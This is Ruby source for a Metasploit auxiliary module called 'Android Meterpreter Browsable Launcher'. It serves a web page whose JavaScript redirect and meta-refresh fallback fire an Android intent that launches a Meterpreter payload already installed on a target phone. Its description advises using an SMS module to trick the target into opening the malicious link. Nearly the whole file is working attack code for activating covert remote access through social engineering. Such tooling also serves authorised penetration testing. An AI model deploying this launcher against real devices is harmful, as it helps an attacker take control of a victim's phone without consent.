##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Android Meterpreter Browsable Launcher",
      'Description'    => %q{
        This module allows you to open an android meterpreter via a browser. An Android
        meterpreter must be installed as an application beforehand on the target device
        in order to use this.

        For best results, you can consider using the auxiliary/client/sms/send_text to
        trick your target into opening the malicious link, and wake up Meterpreter.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'References'     =>
        [
          [ 'URL', 'http://developer.android.com/reference/android/content/Intent.html#CATEGORY_BROWSABLE' ]
        ]
    ))
  end

  def run
    exploit
  end

  def html
%Q|
<html>
<body>
<script>
location.href = "intent://my_host#Intent;scheme=metasploit;action=android.intent.action.VIEW;end";
</script>
<noscript>
<meta http-equiv="refresh" content="1; url=intent://my_host#Intent;scheme=metasploit;action=android.intent.action.VIEW;end">
</noscript>
</body>
</html>
|
  end

  def on_request_uri(cli, request)
    print_status("Sending HTML...")
    send_response(cli, html)
  end
end
